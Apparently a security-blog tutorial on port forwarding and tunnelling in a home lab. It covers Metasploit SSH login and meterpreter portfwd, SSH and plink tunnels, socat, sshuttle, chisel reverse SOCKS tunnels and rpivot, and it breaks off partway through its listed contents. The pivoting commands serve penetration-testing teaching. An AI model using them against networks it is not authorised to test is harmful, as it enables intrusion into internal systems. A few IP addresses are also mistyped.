<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/tunneling-pivoting/" rel="category tag">Tunneling &amp; Pivoting</a></span>            </div>
            <h1 class="post-title entry-title">Port Forwarding &amp; Tunnelling Cheatsheet</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/port-forwarding-tunnelling-cheatsheet/" rel="bookmark"><time class="entry-date published" datetime="2021-02-01T20:01:54+00:00">February 1, 2021</time><time class="updated" datetime="2025-05-10T17:54:46+00:00">May 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">In this article, we are going to learn about the concepts and techniques of Port forwarding and Tunnelling. This article stands as an absolute cheatsheet on the two concepts.</span></p>
<p><span style="color: #000000;">Port forwarding transmits a communication request from one address and the port number while sending the packets in a network. Tunnelling has proven to be highly beneficial as it lets an organisation create their Virtual Private Network with the help of the public network and provide huge cost benefits for users on both the end.</span></p>
<h3><span style="color: #800000;">Table of Content</span></h3>
<ul>
<li><strong><span style="color: #000000;">Apache Virtual Host</span></strong></li>
<li><strong><span style="color: #000000;">Lab Configuration</span></strong></li>
<li><strong><span style="color: #000000;">Port Forwarding</span></strong>
<ul>
<li><span style="color: #000000;">Port Forwarding using Metasploit</span></li>
<li><span style="color: #000000;">SSH Local Port Forwarding (SSH Tunneling)</span></li>
<li><span style="color: #000000;">Port Forwarding using Socat</span></li>
</ul>
</li>
<li><strong><span style="color: #000000;">Tunnelling</span></strong>
<ul>
<li><span style="color: #000000;">Tunnelling using Sshuttle</span></li>
<li><span style="color: #000000;">Tunnelling using Chisel</span></li>
<li><span style="color: #000000;">Chisel using Socks5 Proxy</span></li>
<li><span style="color: #000000;">Rpivot using Socks4 Proxy</span></li>
<li><span style="color: #000000;">Dynamic SSH Tunnelling</span></li>
<li><span style="color: #000000;">Local SSH Tunneling</span></li>
<li><span style="color: #000000;">Local SSH tunnelling using plink.exe</span></li>
<li><span style="color: #000000;">Dynamic SSH tunnelling using plink.exe</span></li>
<li><span style="color: #000000;">Tunnelling using Revsocks</span></li>
<li><span style="color: #000000;">Metasploit (socks5 and socks4a)</span></li>
<li><span style="color: #000000;">Tunnelling with DNScat2</span></li>
<li><span style="color: #000000;">ICMP tunnelling</span></li>
</ul>
</li>
<li><strong><span style="color: #000000;">Conclusion</span></strong></li>
</ul>
<h3><span style="color: #800000;">Apache Virtual Host</span></h3>
<p><span style="color: #000000;">Virtual Web hosting is a concept you may have come across in various Capture-the-Flag challenges. Recently, professionals in corporate environments have also started using it to host their common services under fewer IP address.</span></p>
<p><span style="color: #000000;">Virtual web hosting refers to a method of running several web servers on a single host. Using this method, one computer can host thousands of websites. Moreover, Apache web servers have become one of the most popular web-serving methods because they are extremely powerful and flexible.</span></p>
<p><span style="color: #000000;">Apache can easily transform into a virtual host. This transformation allows the hosting of an individual website. As a result, network administrators can use a single server to host various websites or domains. This setup functions smoothly as long as the server can handle the load of the multiple hosted servers.</span></p>
<h3><span style="color: #800000;">Lab Configuration</span></h3>
<p><span style="color: #000000;">The lab requirements comprise of:</span></p>
<ul>
<li><span style="color: #000000;">VMware Workstation</span></li>
<li><span style="color: #000000;">Ubuntu</span></li>
<li><span style="color: #000000;">Kali Linux</span></li>
</ul>
<p><span style="color: #000000;">Let us start with configuring Apache2 services.  To do this you will need to have Apache installed in your Linux systems. You can install it using</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">apt install apache2</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-yM1lX6YPG8k/YBhAVO3JEuI/AAAAAAAAtN0/6iO4XR6DEgU9cgqtWb9WSZDI4oiDH3lrQCLcBGAsYHQ/s16000/1.png"/></span></p>
<p><span style="color: #000000;">Then we need to create a directory for the websites we have to host.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">mkdir /sbin/test</pre>
<p><span style="color: #000000;">Then go to the <strong>/etc/apache2 </strong>directory and edit the file <strong>ports.conf </strong>and add ‘<strong>Listen 127.0.0.1:8080</strong>‘ before ‘Listen 80’ as in the image below.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd /etc/apache2 
nano ports.conf 
cat ports.conf</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-u4nJRotsUjw/YBhAk-nAIpI/AAAAAAAAtN8/1lcUQpk8RDQIQ-YWkzeT7oLTwTIPrPcnACLcBGAsYHQ/s16000/2.png"/></span></p>
<p><span style="color: #000000;">Now let us create the <strong>test.conf</strong> file and add the following code in <strong>/etc/apache2/sites-available/</strong></span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nano /etc/apache2/sites-available/test.conf
&lt;VirtualHost 127.0.0.1:8080&gt;
  DocumentRoot /sbin/test/
  ServerName  localhost
  AllowEncodedSlashes NoDecode
  &lt;Directory "/sbin/test/"&gt;
    Require all granted
    AllowOverride All
    Options FollowSymLinks MultiViews
  &lt;/Directory&gt;
&lt;/VirtualHost&gt;</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-UoAVYzogkpE/YBhAqTcYOjI/AAAAAAAAtOA/lcJ14tbyw2g6qH-hE3TsUDMC6LXHgmtFACLcBGAsYHQ/s16000/3.png"/></span></p>
<p><span style="color: #000000;">Now let us make use the tool <strong>a2ensite</strong> to enable our website and the let us restart our apache2.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">a2ensite test.conf 
systemctl restart apache2</pre>
<p><span style="color: #000000;">Therefore, here we finish the setup of our lab by creating a virtual host.</span></p>
<h3><span style="color: #800000;">Port Forwarding</span></h3>
<p><span style="color: #000000;">Port forwarding is establishing a secure connection between a remote user and local machines. In organisations on can give their source and destination port numbers to make use of tunnelling with the help of Linux. Along with this, they should also mention the destination which can be the IP address or name of the host.</span></p>
<p><span style="color: #000000;">Let’s switch on the Kali Linux machine and check if the webpage is being hosted. However, it shows that the page is unavailable. Therefore, let us explore how we can forward the local address and port to the remote host. This can be done using various methods. So, let’s examine them one by one.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-wLtyuhH9j2k/YBhAwFohjcI/AAAAAAAAtOE/_p4t2eHFuiw22d9iRzrAJjmHBMuumulMwCLcBGAsYHQ/s16000/4.png"/></span></p>
<h3><span style="color: #800000;">Port Forwarding using Metasploit</span></h3>
<p><span style="color: #000000;">Now we take SSH session using Metasploit. Here we get the meterpreter session and then on using<strong> netstat</strong> command, we observe that port 8080 is running on the local host.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use auxiliary/scanner/ssh/ssh_login 
set rhosts 192.168.1.108 
set username raj 
set password 123 
exploit 
sessions -u 1 
sessions 2 
netstat -antp</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-nZsdwRMmUqY/YBhA3ldcxBI/AAAAAAAAtOM/J99aY08JDJA-oGTSqJtOy5xLO5ckTVMMwCLcBGAsYHQ/s16000/5.png"/></span></p>
<p><span style="color: #000000;">Here we make use of <strong>portfwd</strong> to forward all the traffic to the Kali machine, where you mention the local and the remote port and the local address.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">portfwd add -l 8081 -p 8080 -r 127.0.0.1</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-4ItH2mPX9UU/YBhA9xISh-I/AAAAAAAAtOU/8inOP3_NOK0WNoLngxJBXgwuFLsYy5ZUgCLcBGAsYHQ/s16000/6.png"/></span></p>
<p><span style="color: #000000;">When we load this page on the web browser using 127.0.0.1:8081 in the Kali machine, we see that the contents of the web page are displayed.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-FR3gXA46eQY/YBhBHXW_KSI/AAAAAAAAtOc/S6AjjCwtfaIswVQOQLEkrF3Sbgezx_l4QCLcBGAsYHQ/s16000/7.png"/></span></p>
<h3><span style="color: #800000;">SSH Local Port Forwarding</span></h3>
<p><span style="color: #000000;">SSH uses this method to forward the application ports from a client machine to a server machine. In this setup, the SSH client listens for connections on a configured port. When a connection is received, it tunnels the traffic to an SSH server. Consequently, the server connects to a configured destination port on a machine other than the SSH server.</span></p>
<p><span style="color: #000000;">This opens a connection to the machine with IP 192.168.1.108 and forwards any connection of port 8080 on the local machine to port 8081. To know more about SSH tunnelling, visit <strong><a href="https://www.hackingarticles.in/comprehensive-guide-on-ssh-tunneling/">here</a></strong>.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">ssh -L 8081:localhost:8080 -N -f -l raj 192.168.1.108</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-30tuxA0iI8s/YBhBQASR4cI/AAAAAAAAtOo/QSzVf_6WFWQ1zTIBU4FtMoj_g5IHSUiYACLcBGAsYHQ/s16000/8.png"/></span></p>
<p><span style="color: #000000;">We can see the contents of the web page when we load it in the web browser using 127.0.0.1:8081 on the Kali machine.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-I4S1L9WG5m8/YBhBX4YJEYI/AAAAAAAAtOw/8M2oArEjmsY2KIj_sUm-1QQEQc5QDnLRACLcBGAsYHQ/s16000/9.png"/></span></p>
<h3><span style="color: #800000;">Port Forwarding using Socat</span></h3>
<p><span style="color: #000000;">Socat is generally a command-line utility available in Linux. It transfers data between two hosts. Here, we use it for port forwarding. Specifically, we configure it to redirect all TCP connections from 127.0.0.1:8080 to port 1234.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">socat TCP-LISTEN:1234,fork,reuseaddr tcp:127.0.0.1:8080 &amp;</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-2VVaR0mkc5c/YBhBdnxxDdI/AAAAAAAAtO0/NQm1td0o2AsPsXBOR8u2vYXLfRMq0KHlwCLcBGAsYHQ/s16000/10.png"/></span></p>
<p><span style="color: #000000;">After that, when we load the web page in the browser using 192.168.1.108:1234 on the Kali machine, the browser shows the page contents.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-trq3sLY3kFE/YBhBjE40AaI/AAAAAAAAtO8/J78W21mMXkoFFmbCW9yS4woqZ5zMfKtUwCLcBGAsYHQ/s16000/11.png"/></span></p>
<h3><span style="color: #800000;">Tunnelling</span></h3>
<p><span style="color: #000000;"><strong data-start="2083" data-end="2097">Tunnelling</strong> allows users to access remote resources over a public network. In this method, users establish point-to-point tunnels. As a result, remote users connect to the network through the tunnel’s other endpoint. Tunnelling protocols encapsulate the remote user’s traffic. Then, they send the traffic through the public network. Finally, the protocol decapsulates the traffic and delivers it to the intended user. Although the tunnel is not encrypted by default, its security depends on the selected TCP/IP protocol.</span></p>
<p><span style="color: #000000;">Let us look at how we can perform Tunnelling using various methods and tools.</span></p>
<h3><span style="color: #800000;"><u>Lab Requirements</u></span></h3>
<ul>
<li><span style="color: #000000;">Kali Linux with IP address <strong>192.168.1.2</strong></span></li>
<li><span style="color: #000000;">Ubuntu with 2 NIC, consisting of two IP addresses – <strong>192.68.1.108, 192.168.226.128</strong></span></li>
<li><span style="color: #000000;">Metasploitable 2 with IP address <strong>192.168.226.129</strong></span></li>
</ul>
<p><img decoding="async" src="https://1.bp.blogspot.com/-bPwjsc6BNLU/YBjrmr-mHiI/AAAAAAAAtVw/vGkwBwqyqwopoGwu8CeKynI0z-o0Sr7fACLcBGAsYHQ/s16000/12.png"/></p>
<h3><span style="color: #800000;">Sshuttle</span></h3>
<p><span style="color: #000000;">Sshuttle facilitates to generate a VPN connection from a local machine to a remote Kali Linux with the help of SSH. For the proper functioning, one must have root access on the local machine but the remote Kali Linux can have any type of account. Sshuttle can run more than once concurrently on a particular client machine.</span></p>
<p><span style="color: #000000;">Let’s see how we can use Sshuttle to get the access of a Metasploitable 2 machine which has a different subnet using Ubuntu machine which has two internet addresses with different subnets but also has the subnet in which the Kali Linux is present.</span></p>
<p><span style="color: #000000;">Now let’s check the IP addresses of the Kali Linux machine</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ahy5UgLZGfY/YBhB17GsdrI/AAAAAAAAtPQ/Y8NnB0-lmucvW62kbwY7l7VWxQ03TWY2gCLcBGAsYHQ/s16000/50.png"/></span></p>
<p><span style="color: #000000;">On checking the IP address of the Ubuntu machine we see that it has two IP addresses with different subnets.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-wWjWQ_VvyDI/YBhB7hsohuI/AAAAAAAAtPU/m3J1h87OPpkLuO_Uqm0vHZ2qAgNCjJrNQCLcBGAsYHQ/s16000/51.png"/></span></p>
<p><span style="color: #000000;">Then, let’s install the tool <strong>Sshuttle</strong> in the Kali Linux machine.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">apt install sshuttle</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-jfwnITF8cR8/YBhCBUGUScI/AAAAAAAAtPc/GBfNpjlz4CYFZawymDw2cqxWAhsW39SigCLcBGAsYHQ/s16000/52.png"/></span></p>
<p><span style="color: #000000;">A connection is created remotely with the Ubuntu (raj@192.168.1.108) and then the address of Metasploitable 2(192.168.226.129) using Sshuttle. Mention the password of Ubuntu and hence you are connected.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">sshuttle -r raj@192.168.1.108 192.168.226.129</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-87J8_M0ky0w/YBhCI0Tg4qI/AAAAAAAAtPk/4xRZOp0hhfI3VRsxLcaxQkUbrWXwPnkQgCLcBGAsYHQ/s16000/53.png"/></span></p>
<p><span style="color: #000000;">Subsequently, when you put the Metasploitable 2 IP address in your Kali Linux’s browser, you will able to access the Metasploitable 2 on port 80.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-xEJOZqpt47s/YBhCPNAbtII/AAAAAAAAtPo/eMLJRV9PqLQ1YOgF_1FRoq4kMjKfTndFwCLcBGAsYHQ/s16000/54.png"/></span></p>
<p><span style="color: #000000;">Hence, here we saw that using Sshuttle, we first connected the Kali Linux with Ubuntu. Once the connection with Ubuntu was made, using that, a connection between Kali Linux and Metasploitable 2 was created.  </span></p>
<h3><span style="color: #800000;">Chisel</span></h3>
<p><span style="color: #000000;"><strong data-start="176" data-end="186">Chisel</strong> acts as a TCP/UDP tunnel that transports data securely using SSH. It includes both the client and the Kali Linux machine in its setup. Typically, users rely on it to bypass firewalls. Additionally, it can provide a secure connection to a private network. Let us now see how this works.</span></p>
<p><span style="color: #000000;">First, we need to install Chisel and Golang on our Kali Linux machines.</span></p>
<p><span style="color: #000000;"><strong data-start="547" data-end="556">Note:</strong> Chisel is written in Golang. Therefore, to ensure it functions correctly, we must also install Golang.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">git clone https://github.com/jpillora/chisel.git 
apt install golang</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-2L_UsUL9Nok/YBhCXWTHzeI/AAAAAAAAtPw/bzplKzi9dh8Iicxa3U-qQykepIKxbUHvACLcBGAsYHQ/s16000/60.png"/></span></p>
<p><span style="color: #000000;">Now as we now have a copy of the chisel source, we can now proceed to build our binaries for Linux land hence compile the packages of the chisel using go build to begin.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">go build -ldflags="-s -w"</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ZuA5jNRbTh8/YBhCeLVvAfI/AAAAAAAAtP4/KDcWOLZAEQ8nWU13sipa5eupZGwPm4kwwCLcBGAsYHQ/s16000/61.png"/></span></p>
<p><span style="color: #000000;">To listen on port 8000 on the Kali Linux and allow clients to specify reverse port forwarding. Here the reverse tunnelling has been activated.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">./chisel server -p 8000 --reverse</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-cp_oFepjLh4/YBhCky04UvI/AAAAAAAAtQA/Naf_zlVbvJ0Y3MEONlqrsEsDVqJL2dMAgCLcBGAsYHQ/s16000/62.png"/></span></p>
<h4><span style="text-decoration: underline; color: #000000;">Install Chisel on Ubuntu</span></h4>
<p><span style="color: #000000;">Now let us install chisel and golang on Ubuntu, and compile all the packages.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">git clone https://github.com/jpillora/chisel.git 
apt install golang 
cd chisel/ 
go build -ldflags="-s -w"</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ewKy4qXYekI/YBhCre5mFkI/AAAAAAAAtQI/_v98Rt_5TIIACvFkVsLnPPIKORF-qM19QCLcBGAsYHQ/s16000/63.png"/></span></p>
<p><span style="color: #000000;">After this done, let’s run chisel on Ubuntu to connect Kali Linux and Metasploitable 2.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">./chisel client 192.168.1.2:8000 R:5000:192.168.226.129:80</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-I4cDb8mSGNQ/YBhCyD7trtI/AAAAAAAAtQM/dUkh94YWbSscf3DgaVVcWi_99UP3nRapgCLcBGAsYHQ/s16000/64.png"/></span></p>
<p><span style="color: #000000;">Open the web browser in the Kali Linux machine to check the connection between the Kali Linux and Metasploitable 2 which is created on the local address and port 5000.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://127.0.0.1:5000</pre>
<p><span style="color: #000000;"><strong> <img decoding="async" src="https://1.bp.blogspot.com/-srCDIUqRtsg/YBhC4LPSP-I/AAAAAAAAtQU/yEXT2YdntQQufQ9QFniFKeYyAXBnK6FngCLcBGAsYHQ/s16000/65.png"/></strong></span></p>
<h4><span style="color: #000000;">Chisel using Socks5 proxy</span></h4>
<p><span style="color: #000000;">We can follow the initial set-up steps in Ubuntu and Kali Linux as seen in the chisel above proceed ahead.</span></p>
<p><span style="color: #000000;">To listen on port 8000 on the Kali Linux and allow clients to specify reverse port forwarding. Here the reverse tunnelling has been activated.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">./chisel server -p 8000 --reverse</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ZXPPnE7FKtQ/YBhC_oZrVAI/AAAAAAAAtQY/ZetNYcgx9R0wmAJ95uSYOeEEfzfSI5PjQCLcBGAsYHQ/s16000/66.png"/></span></p>
<p><span style="color: #000000;">In ubuntu machine, the next step is to connect to our client using the new reverse socks option.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">./chisel client 192.168.1.2:8000 R:socks</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-402I5owqYsg/YBhDH6tsAPI/AAAAAAAAtQk/CEu2NFDzP7AgWKHFeGMn6j9cPJ_k9IUmQCLcBGAsYHQ/s16000/67.png"/></span></p>
<p><span style="color: #000000;">Now we connect the Ubuntu to Metasploitable 2.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">./chisel client 192.168.1.2:8000 R:8001:192.168.226.129:9001</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-BGXY9VgN7zE/YBhDR-glVPI/AAAAAAAAtQs/jrzWAaX2sBAxo90WosbVc74fJa-RT35PACLcBGAsYHQ/s16000/68.png"/></span></p>
<p><span style="color: #000000;">Here we point our Socks5 client which is Metasploitable 2 to the Kali Linux using Ubuntu.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">./chisel server -p 9001 --socks5</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-3ddKCf-2RU4/YBhDkISAbMI/AAAAAAAAtQ4/yWCUcuSgozIxf8Hg9XHr5JXIcXStcAcLQCLcBGAsYHQ/s16000/69.png"/></span></p>
<p><span style="color: #000000;">Now let’s open the web browser in the Kali Linux and go to configure the <strong>proxy settings</strong>. Here we are manually configuring the proxy, therefore, mention the SOCKS host address as the local address i.e., 127.0.0.1 and choose <strong>socks5 proxy</strong> on port 1080. Also, mention the local address in the ‘<strong>no proxy for</strong>’ box.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-61FMZz1UyUY/YBhDsy4H0nI/AAAAAAAAtQ8/bBgWLtla8csX9YYux-upKhD48rOZx9x-gCLcBGAsYHQ/s16000/70.png"/></span></p>
<p><span style="color: #000000;">When you open the web browser in the Kali Linux machine and add the Metasploitable 2 IP, you see that the Kali Linux is connected to the Metasploitable 2.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-tEXcNXFKQvA/YBhDzLNPPFI/AAAAAAAAtRA/vKWjMzUONccjVkRluPv2Dnk4thvyZwBfACLcBGAsYHQ/s16000/71.png"/></span></p>
<h3><span style="color: #800000;">Rpivot using Socks4 proxy</span></h3>
<p><span style="color: #000000;">RPIVOT generally provides tunnel traffic into the internal network using socks 4 proxy. Its working is like SSH dynamic port forwarding but is in the opposite direction. It also has a client-server architecture. When a run client on the machine it will tunnel the traffic through and for that the Kali Linux should be enabled so that it can listen to the connections from the client.</span></p>
<p><span style="color: #000000;">Let’s install Rpivot in the Kali Linux machine. Then go to its directory and start the listener on port 9999, which creates socks version 4 proxy on 127.0.0.1 on a port while connecting with the client</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">git clone https://github.com/klsecservices/rpivot.git 
python server.py --server-port 9999 --server-ip 192.168.1.2 --proxy-ip 127.0.0.1 --proxy-port 1080</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-voEAOTZqWoE/YBhD6GsrNMI/AAAAAAAAtRI/rlWwAEP99lo69FvLpg3xrFa3SmcDzsBHQCLcBGAsYHQ/s16000/90.png"/></span></p>
<p><span style="color: #000000;">Now install rpivot in the <strong>Ubuntu</strong> machine and connect it with the Kali Linux</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">git clone https://github.com/klsecservices/rpivot.git 
python client.py --server-ip 192.168.1.2 --server-port 9999</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-lkeCPYzDzfE/YBhEBKDX5LI/AAAAAAAAtRQ/rMwbd1vY3KAUXEOcgTGLvCoEuXNnAuHBACLcBGAsYHQ/s16000/91.png"/></span></p>
<p><span style="color: #000000;">Now go to the web browser in your Kali Linux machine, and <strong>manually configure the proxy</strong>. Set the Socks host address as local address and port as 1080. Select the <strong>Socks version 4</strong> and mention the local address for ’<strong>no proxy for</strong>’.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-MDLR2OeN9dk/YBhEIItNxUI/AAAAAAAAtRU/LpeTEWDN8z8c2dO2R5V8yHN_3HI7W-3_gCLcBGAsYHQ/s16000/92.png"/></span></p>
<p><span style="color: #000000;">Now when you open the web browser in your Kali Linux machine, but the IP address of the Metasploitable 2 and hence you will be able to see the connection.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-2ruGss0nfGI/YBhEObnom5I/AAAAAAAAtRc/7OTKQvtB-XchsIZh3theT2hQUP2T3QNHgCLcBGAsYHQ/s16000/93.png"/></span></p>
<h3><span style="color: #800000;">Dynamic SSH Tunneling</span></h3>
<p><span style="color: #000000;">Dynamic SSH Tunneling provides a connection with the range of ports by making SSH work like a SOCKS proxy Kali Linux.  A SOCKS proxy is an SSH tunnel where applications send their traffic using a tunnel where the proxy sends it traffic like how it is sent to the internet. In SOCKS proxy, it is mandatory to configure the individual client. Dynamic Tunneling can receive connections from numerous ports.</span></p>
<p><span style="color: #000000;">In Kali Linux machine let’s run the command to connect with the Ubuntu using Dynamic SSH tunnelling.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">ssh -D 7000 raj@192.168.1.108</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ghxadAqCPPk/YBhEVlO7VQI/AAAAAAAAtRk/lEcYdAAOGk05QMj0WvJl3pNvtKGprS0mACLcBGAsYHQ/s16000/150.png"/></span></p>
<p><span style="color: #000000;">Once the connection between the Kali Linux and Ubuntu is made, let’s open the browser in the Kali Linux machine and configure the proxy in the settings. Choose to <strong>manually configure the proxy</strong> and mention the local address as the socks host and the port number as 7000. Now select the <strong>socks version 5</strong> and mention the local address in ‘<strong>no proxy for</strong>’ section.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-MOkaAnOZNRQ/YBhEcVEppaI/AAAAAAAAtRs/V4WFnIyxn_cu-ZVMXX-wvB-ixYyRYC7VACLcBGAsYHQ/s16000/151.png"/></span></p>
<p><span style="color: #000000;">Hence when you put the IP of the Metasploitable 2 in the browser of the Kali Linux, you will have an accessible connection Metasploitable 2 using dynamic Tunnelling.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-k5bkA5SBmI0/YBhEj6G5rII/AAAAAAAAtR0/pJkauDqEwAgbOfaPhL1XvAqmucrEdbycwCLcBGAsYHQ/s16000/152.png"/></span></p>
<h3><span style="color: #800000;">Local SSH Tunneling</span></h3>
<p><span style="color: #000000;">Here, all the connections which are trying to connect with the Metasploitable 2 using Ubuntu with the local destination and port. The -L indicates the local port.</span></p>
<p><span style="color: #000000;">In the Kali Linux machine, add the localhost and then the Metasploitable 2 username and password to create local SSH tunnelling</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">ssh -L 7000:192.168.22.129:80 raj@192.168.1.108</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-tLVW0CQ2byk/YBhEseJSQwI/AAAAAAAAtSA/TqVnZeHkAGYdkz3KxYxP7pp-7McQFjOdQCLcBGAsYHQ/s16000/153.png"/></span></p>
<p><span style="color: #000000;">You can open the Kali Linux’s browser and mention the local address along with the port 7000 on which the traffic was transferred.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-2BSNGxEjrms/YBhEzmljq1I/AAAAAAAAtSE/jeqaMTZ742Ed2zHqITiIx4NZgyV1u_aNgCLcBGAsYHQ/s16000/154.png"/></span></p>
<h3><span style="color: #800000;">Local SSH Tunnelling using Plink.exe</span></h3>
<p><span style="color: #000000;">Here we are making use of command-line in windows machine for tunnelling, where a command-line tool for Putty is being used called plink.exe. Here all the connections which are trying to connect with the Metasploitable 2 using Ubuntu with the local destination and port.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">plink.exe -L 7000:192.168.226.129:80 raj@192.168.1.108</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-j738NV7q4A0/YBhE8IgsdTI/AAAAAAAAtSI/cub94WlGhmAp1_dlRvrATkYxLP1c8sbKACLcBGAsYHQ/s16000/155.png"/></span></p>
<p><span style="color: #000000;">Now open the web browser in the window’s machine and put the local address and the port 7000 on which the traffic of Metasploitable 2 was forwarded. You see that there was local SSH Tunnelling between Metasploitable 2 and the Kali Linux using plink.exe</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-HSFBaTaSPQ0/YBhFENQ40wI/AAAAAAAAtSQ/KcH6KYGbBW4tO1AM7Ii4sE76YFainXncACLcBGAsYHQ/s16000/156.png"/></span></p>
<h3><span style="color: #800000;">Dynamic SSH Tunneling using Plink.exe</span></h3>
<p><span style="color: #000000;">Plink.exe is the windows command line for putty in the windows machine which we will use for Dynamic Tunneling can receive connections from numerous ports.</span></p>
<p><span style="color: #000000;">In Kali Linux machine let’s run the command to connect with the Ubuntu using Dynamic SSH tunnelling.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">plink.exe -D 8000 raj@192.168.1.108</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-m6eTfOdDOxg/YBhFLlDeo6I/AAAAAAAAtSY/bnWGSyHzod4rRSyvJhBasxhVXbU6pI5uwCLcBGAsYHQ/s16000/157.png"/></span></p>
